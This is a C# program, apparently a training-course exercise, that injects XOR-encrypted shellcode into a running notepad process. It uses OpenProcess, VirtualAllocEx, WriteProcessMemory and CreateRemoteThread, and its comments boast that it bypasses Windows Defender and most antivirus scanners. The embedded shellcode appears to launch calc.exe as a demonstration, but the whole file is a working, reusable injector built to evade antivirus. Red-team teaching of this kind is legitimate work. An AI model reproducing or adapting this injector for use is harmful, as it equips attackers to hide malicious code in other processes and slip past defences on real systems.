using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Base code taken from Exercise 2, refer there if anything is unclear

// While there is a lot more evasion to do here, this example bypasses Windows Defender
// It also scores a 'low' 3/26 on Antiscan (your mileage may vary)

namespace Injector
{

    public class BasicAVEvasion
    {
        // Define our key, in this case we use a single-byte key for XOR operations
        private static uint key = 0x37;

        // Helper function to XOR-decrypt our shellcode byte array
        private static byte[] xorDecryptBytes(byte[] encrypted)
        {
            byte[] decrypted = new byte[encrypted.Length];
            for (int i = 0; i < encrypted.Length; i++)
            {
                decrypted[i] = (byte)((uint)encrypted[i] ^ key);
            }
            return decrypted;
        }

        // Helper function to XOR-decrypt a string
        private static string xorDecryptString(byte[] encrypted) 
        {
            string decrypted = "";
            for (int i = 0; i < encrypted.Length; i++)
            {
                decrypted += (char)((uint)encrypted[i] ^ key);
            }
            return decrypted;
        }

        // P/Invoke declarations
        // Note that this still causes indicators to appear, see Bonus Exercise 3 for details
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }
        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr procHandle, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr procHandle, IntPtr lpBaseAddress, byte[] lpscfer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr procHandle, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        public static void Main()
        {

            // Define our encrypted shellcode here
            // Refer to 'Encrypt.cs' for generation
            byte[] scEnc = new byte[296] {
                0xcb, 0x7f, 0xb4, 0xd3, 0xc7, 0xdf, 0xf7, 0x37, 0x37, 0x37, 0x76, 0x66, 0x76, 0x67, 0x65,
                0x66, 0x61, 0x7f, 0x06, 0xe5, 0x52, 0x7f, 0xbc, 0x65, 0x57, 0x7f, 0xbc, 0x65, 0x2f, 0x7f,
                0xbc, 0x65, 0x17, 0x7f, 0xbc, 0x45, 0x67, 0x7f, 0x38, 0x80, 0x7d, 0x7d, 0x7a, 0x06, 0xfe,
                0x7f, 0x06, 0xf7, 0x9b, 0x0b, 0x56, 0x4b, 0x35, 0x1b, 0x17, 0x76, 0xf6, 0xfe, 0x3a, 0x76,
                0x36, 0xf6, 0xd5, 0xda, 0x65, 0x76, 0x66, 0x7f, 0xbc, 0x65, 0x17, 0xbc, 0x75, 0x0b, 0x7f,
                0x36, 0xe7, 0xbc, 0xb7, 0xbf, 0x37, 0x37, 0x37, 0x7f, 0xb2, 0xf7, 0x43, 0x50, 0x7f, 0x36,
                0xe7, 0x67, 0xbc, 0x7f, 0x2f, 0x73, 0xbc, 0x77, 0x17, 0x7e, 0x36, 0xe7, 0xd4, 0x61, 0x7f,
                0xc8, 0xfe, 0x76, 0xbc, 0x03, 0xbf, 0x7f, 0x36, 0xe1, 0x7a, 0x06, 0xfe, 0x7f, 0x06, 0xf7,
                0x9b, 0x76, 0xf6, 0xfe, 0x3a, 0x76, 0x36, 0xf6, 0x0f, 0xd7, 0x42, 0xc6, 0x7b, 0x34, 0x7b,
                0x13, 0x3f, 0x72, 0x0e, 0xe6, 0x42, 0xef, 0x6f, 0x73, 0xbc, 0x77, 0x13, 0x7e, 0x36, 0xe7,
                0x51, 0x76, 0xbc, 0x3b, 0x7f, 0x73, 0xbc, 0x77, 0x2b, 0x7e, 0x36, 0xe7, 0x76, 0xbc, 0x33,
                0xbf, 0x7f, 0x36, 0xe7, 0x76, 0x6f, 0x76, 0x6f, 0x69, 0x6e, 0x6d, 0x76, 0x6f, 0x76, 0x6e,
                0x76, 0x6d, 0x7f, 0xb4, 0xdb, 0x17, 0x76, 0x65, 0xc8, 0xd7, 0x6f, 0x76, 0x6e, 0x6d, 0x7f,
                0xbc, 0x25, 0xde, 0x60, 0xc8, 0xc8, 0xc8, 0x6a, 0x7f, 0x8d, 0x36, 0x37, 0x37, 0x37, 0x37, 
                0x37, 0x37, 0x37, 0x7f, 0xba, 0xba, 0x36, 0x36, 0x37, 0x37, 0x76, 0x8d, 0x06, 0xbc, 0x58,
                0xb0, 0xc8, 0xe2, 0x8c, 0xd7, 0x2a, 0x1d, 0x3d, 0x76, 0x8d, 0x91, 0xa2, 0x8a, 0xaa, 0xc8,
                0xe2, 0x7f, 0xb4, 0xf3, 0x1f, 0x0b, 0x31, 0x4b, 0x3d, 0xb7, 0xcc, 0xd7, 0x42, 0x32, 0x8c,
                0x70, 0x24, 0x45, 0x58, 0x5d, 0x37, 0x6e, 0x76, 0xbe, 0xed, 0xc8, 0xe2, 0x74, 0x0d, 0x6b,
                0x40, 0x5e, 0x59, 0x53, 0x58, 0x40, 0x44, 0x6b, 0x44, 0x4e, 0x44, 0x43, 0x52, 0x5a, 0x04,
                0x05, 0x6b, 0x54, 0x56, 0x5b, 0x54, 0x19, 0x52, 0x4f, 0x52, 0x37
            };

            // Define the encrypted string "notepad"
            byte[] notepadEnc = new byte[7] {
                0x59, 0x58, 0x43, 0x52, 0x47, 0x56, 0x53
            };

            // Decode and use the encrypted string here
            Process[] expProc = Process.GetProcessesByName(xorDecryptString(notepadEnc));
            if(expProc.Length == 0){ 
                // We get rid of static strings but still have to handle exceptions to prevent alerts to the user
                return;
             }

            int pid = expProc[0].Id;

            IntPtr procHandle = OpenProcess(ProcessAccessFlags.All, false, pid);

            IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)scEnc.Length, AllocationType.Commit | AllocationType.Reserve, 
                MemoryProtection.ExecuteReadWrite);

            // Decrypt our shellcode at the very last moment, before we copy it
            byte[] sc = xorDecryptBytes(scEnc);

            IntPtr bytesWritten;
            bool procMemResult = WriteProcessMemory(procHandle, memAddr, sc, scEnc.Length, out bytesWritten);

            IntPtr tAddr = CreateRemoteThread(procHandle, IntPtr.Zero, 0, memAddr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}